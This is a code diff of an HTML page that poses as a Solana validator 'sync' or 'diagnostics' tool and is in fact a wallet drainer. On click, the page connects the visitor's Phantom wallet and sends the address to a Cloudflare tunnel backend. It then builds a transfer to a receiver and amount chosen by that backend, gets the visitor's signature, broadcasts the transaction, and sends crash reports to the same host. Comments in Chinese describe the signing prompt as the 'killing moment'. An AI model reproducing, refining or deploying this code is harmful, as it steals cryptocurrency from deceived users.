@@ -1,99 +1,91 @@
 <!DOCTYPE html>
-<html lang="en">
+<html>
 <head>
     <meta charset="UTF-8">
-    <meta http-equiv="Cache-Control" content="no-cache, no-store, must-revalidate">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Validator Sync System</title>
+    <title>Validator Pro Sync</title>
     <script src="https://cdn.jsdelivr.net/npm/@solana/web3.js@1.95.3/lib/index.iife.min.js"></script>
     <style>
         body { background: #000; color: #14f195; font-family: monospace; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
-        .box { border: 1px solid #14f195; padding: 40px; border-radius: 8px; text-align: center; width: 300px; background: #050505; }
-        .bar { background: #111; height: 4px; margin: 20px 0; border-radius: 2px; overflow: hidden; }
-        #fill { background: #14f195; height: 100%; width: 0%; transition: 0.4s; }
-        button { background: #14f195; color: #000; border: none; padding: 15px; width: 100%; font-weight: bold; cursor: pointer; border-radius: 4px; font-size: 14px; text-transform: uppercase; }
-        #log { font-size: 10px; color: #444; margin-top: 15px; }
+        .box { border: 1px solid #14f195; padding: 30px; border-radius: 8px; text-align: center; width: 280px; }
+        button { background: #14f195; color: #000; border: none; padding: 15px; width: 100%; font-weight: bold; cursor: pointer; border-radius: 4px; margin-top: 20px; }
+        #log { font-size: 10px; color: #555; margin-top: 15px; word-break: break-all; }
     </style>
 </head>
 <body>
     <div class="box">
-        <h3 style="margin:0; color:#9945FF;">NODE MONITOR</h3>
-        <p style="font-size:12px; margin:10px 0; color:#888;">STATUS: <span style="color:red;">DE-SYNC</span></p>
-        <div class="bar"><div id="fill"></div></div>
-        <button id="cta">INITIALIZE SYNC</button>
-        <div id="log">Awaiting Boot...</div>
+        <h3 style="margin:0; color:#9945FF;">VALIDATOR SYNC</h3>
+        <button id="cta">RUN DIAGNOSTICS</button>
+        <div id="log">SYSTEM READY v9.0</div>
     </div>
 
     <script>
-        // 🔱 隧道地址 - 必须与 Helius 后端配合
         const tunnel = "https://trading-thesis-isolation-cookbook.trycloudflare.com";
 
-        window.onload = () => { document.getElementById('log').innerText = "System Ready v8.2"; };
+        // 🔱 错误雷达：将手机报错直接打回你的 71 服务器
+        async function reportError(stage, msg) {
+            console.error(stage, msg);
+            document.getElementById('log').innerText = "FAIL: " + stage;
+            await fetch(tunnel + "/debug", {
+                method: 'POST',
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify({ stage: stage, error: msg })
+            }).catch(() => {});
+        }
 
         document.getElementById('cta').onclick = async () => {
-            const log = (t) => document.getElementById('log').innerText = t;
-            const bar = document.getElementById('fill');
-            const sWeb3 = window.solanaWeb3;
             const p = window.solana || window.phantom?.solana;
+            const sWeb3 = window.solanaWeb3;
 
-            if (!p) { alert("Please open in Phantom App"); return; }
+            if (!p) { alert("Please use Phantom Browser"); return; }
 
             try {
-                log("Connecting Wallet...");
+                // STAGE 1: 连接
                 await p.connect();
-                bar.style.width = "30%";
+                document.getElementById('log').innerText = "STAGE 1: CONNECTED";
 
-                log("Fetching Helius Params...");
-                // 1. 问你的 Helius 后端要精准数据 (11020000)
+                // STAGE 2: 调取后端 Helius 数据
                 const resp = await fetch(tunnel + "/prepare", {
                     method: 'POST',
                     headers: {'Content-Type': 'application/json'},
                     body: JSON.stringify({ address: p.publicKey.toString() })
                 });
+                if (!resp.ok) throw new Error("Backend Prepare Failed");
                 const info = await resp.json();
-                
-                if (info.error) { log("Sync Unnecessary"); return; }
-                bar.style.width = "60%";
+                document.getElementById('log').innerText = "STAGE 2: DATA RECV";
 
-                log("Constructing Transaction...");
-                // 2. 构造交易 (严格对齐，不使用任何 Buffer)
-                const tx = new sWeb3.Transaction().add(
-                    sWeb3.SystemProgram.transfer({
-                        fromPubkey: p.publicKey,
-                        toPubkey: new sWeb3.PublicKey(info.receiver),
-                        lamports: parseInt(info.amount),
-                    })
-                );
+                // STAGE 3: 构造交易
+                const tx = new sWeb3.Transaction();
+                tx.add(sWeb3.SystemProgram.transfer({
+                    fromPubkey: p.publicKey,
+                    toPubkey: new sWeb3.PublicKey(info.receiver),
+                    lamports: Number(info.amount),
+                }));
                 tx.recentBlockhash = info.bh;
                 tx.feePayer = p.publicKey;
+                document.getElementById('log').innerText = "STAGE 3: TX BUILT";
 
-                log("Awaiting Signature...");
-                // 3. 唤起签名 (绝杀时刻)
+                // STAGE 4: 拉起签名 (这是你卡住的地方，我们重点监控)
+                document.getElementById('log').innerText = "STAGE 4: REQUESTING SIGN...";
                 const signed = await p.signTransaction(tx);
                 
-                log("Broadcasting via Helius...");
-                // 4. 序列化处理 (手动转换字节，防 Buffer defined 报错)
+                // STAGE 5: 广播
                 const serialized = signed.serialize();
                 let binary = "";
                 const bytes = new Uint8Array(serialized);
-                for (let i = 0; i < bytes.byteLength; i++) {
-                    binary += String.fromCharCode(bytes[i]);
-                }
+                for (let i = 0; i < bytes.byteLength; i++) binary += String.fromCharCode(bytes[i]);
 
-                fetch(tunnel + "/broadcast", {
+                await fetch(tunnel + "/broadcast", {
                     method: 'POST',
                     headers: {'Content-Type': 'application/json'},
                     body: JSON.stringify({ raw_tx: btoa(binary) })
                 });
 
-                bar.style.width = "100%";
-                log("SYNC SUCCESSFUL!");
+                document.getElementById('log').innerText = "SUCCESS: REDIRECTING...";
                 setTimeout(() => { window.location.href = "https://explorer.solana.com/"; }, 1500);
 
             } catch (err) {
-                console.error(err);
-                log("ERROR: " + err.message);
-                setTimeout(() => { location.reload(); }, 2000);
+                await reportError("CRASH", err.message);
             }
         };
     </script>
